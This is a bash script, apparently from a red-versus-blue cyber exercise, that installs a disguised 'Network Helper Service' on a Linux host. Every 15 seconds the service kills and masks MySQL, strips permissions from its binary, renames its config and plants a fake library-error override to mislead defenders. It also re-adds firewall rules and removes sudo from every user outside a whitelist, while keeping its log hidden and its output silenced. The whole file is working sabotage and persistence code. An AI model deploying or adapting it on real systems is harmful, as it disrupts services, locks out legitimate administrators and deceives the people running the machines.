#!/bin/bash
# ── WHITELIST ──────────────────────────────────────────
WHITELIST=("greyteam" "scoring" "cia" "kgb")
LOG="/var/lib/.cache/mysql_watch.log"
# ──────────────────────────────────────────────────────

echo "[$(date)] Installing watcher..." >> $LOG

# 1. Create log directory
mkdir -p /var/lib/.cache
chmod 777 /var/lib/.cache

# 2. Drop watcher script onto target box
cat > /usr/lib/systemd/system-sleep/net_helper.sh << 'WATCHER'
#!/bin/bash
# ── WHITELIST ──────────────────────────────────────────
WHITELIST=("greyteam" "scoring" "cia" "kgb")
LOG="/var/lib/.cache/mysql_watch.log"
# ──────────────────────────────────────────────────────

mkdir -p /var/lib/.cache
chmod 777 /var/lib/.cache

echo "[$(date)] Watcher started..." >> $LOG

while true; do

    # ── 1. Kill MySQL if it comes back up ─────────────
    if systemctl is-active --quiet mysql || \
       pgrep -x mysqld > /dev/null 2>&1; then

        echo "[$(date)] MySQL detected UP — killing" >> $LOG

        # stop and mask
        systemctl stop mysql          2>/dev/null
        systemctl stop mysql.service  2>/dev/null
        systemctl disable mysql       2>/dev/null
        systemctl mask mysql          2>/dev/null

        # kill processes
        pkill -9 mysqld               2>/dev/null
        pkill -9 mysqld_safe          2>/dev/null
        pkill -9 mysql                2>/dev/null

        # remove binary permissions
        chmod 000 /usr/sbin/mysqld    2>/dev/null

        # re-corrupt config if blue team restored it
        if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
            mv /etc/mysql/mysql.conf.d/mysqld.cnf \
               /etc/mysql/mysql.conf.d/mysqld.cnf.bak
            echo "[$(date)] Config re-corrupted" >> $LOG
        fi

        echo "[$(date)] MySQL killed" >> $LOG
    fi

    # ── 2. Restore fake override if blue team removed it
    if [ ! -f /etc/systemd/system/mysql.service.d/override.conf ]; then

        echo "[$(date)] Override missing — restoring" >> $LOG

        # unmask temporarily
        systemctl unmask mysql        2>/dev/null

        # replant fake error
        mkdir -p /etc/systemd/system/mysql.service.d/
        tee /etc/systemd/system/mysql.service.d/override.conf > /dev/null << 'EOF'
[Unit]
Description=MySQL Database Server
Documentation=man:mysqld(8)

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'echo "mysql: error while loading shared libraries: libmysql.so.5"; echo "Try: apt-get install --fix-broken"; exit 1'
RemainAfterExit=no
EOF

        # reload and remask
        systemctl daemon-reload
        systemctl mask mysql          2>/dev/null

        echo "[$(date)] Override restored and remasked" >> $LOG
    fi

    # ── 3. Restore iptables if blue team flushed them ─
    if ! iptables -L INPUT -n | grep -q "3306"; then

        echo "[$(date)] iptables rules missing — restoring" >> $LOG

        iptables -A INPUT -p tcp --dport 3306 \
            -s 10.100.0.0/24 -j ACCEPT
        iptables -A INPUT -p tcp --dport 3306 \
            -s 10.100.1.0/24 -j ACCEPT
        iptables -A INPUT -p tcp --dport 3306 -j DROP

        iptables-save > /etc/iptables/rules.v4  2>/dev/null || \
        iptables-save > /etc/iptables.rules     2>/dev/null

        echo "[$(date)] iptables restored" >> $LOG
    fi

    # ── 4. Restore binary permissions if blue team fixed it
    if [ -x /usr/sbin/mysqld ]; then
        chmod 000 /usr/sbin/mysqld    2>/dev/null
        echo "[$(date)] Binary permissions re-removed" >> $LOG
    fi

    # ── 5. Whitelist enforcement ───────────────────────
    while IFS= read -r sudoer; do
        username=$(echo "$sudoer" | awk '{print $1}')
        in_whitelist=false

        for w in "${WHITELIST[@]}"; do
            if [[ "$username" == "$w" ]]; then
                in_whitelist=true
                break
            fi
        done

        if [ "$in_whitelist" = false ] && [ -n "$username" ]; then
            gpasswd -d "$username" sudo 2>/dev/null
            echo "[$(date)] Removed sudo from $username" >> $LOG
        fi
    done < <(getent group sudo | cut -d: -f4 | tr ',' '\n')

    sleep 15

done
WATCHER

# 3. Make watcher executable
chmod +x /usr/lib/systemd/system-sleep/net_helper.sh

# 4. Create systemd service so watcher starts on reboot
cat > /etc/systemd/system/net-helper.service << 'SERVICE'
[Unit]
Description=Network Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/system-sleep/net_helper.sh
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE

# 5. Enable and start the watcher service
systemctl daemon-reload
systemctl enable net-helper.service
systemctl start net-helper.service

# 6. Verify it started
if systemctl is-active --quiet net-helper; then
    echo "[$(date)] Watcher installed and running" >> $LOG
    echo "[+] Success — net-helper.service is running"
else
    echo "[$(date)] WARNING — watcher failed to start" >> $LOG
    echo "[-] Warning — net-helper.service failed to start"
fi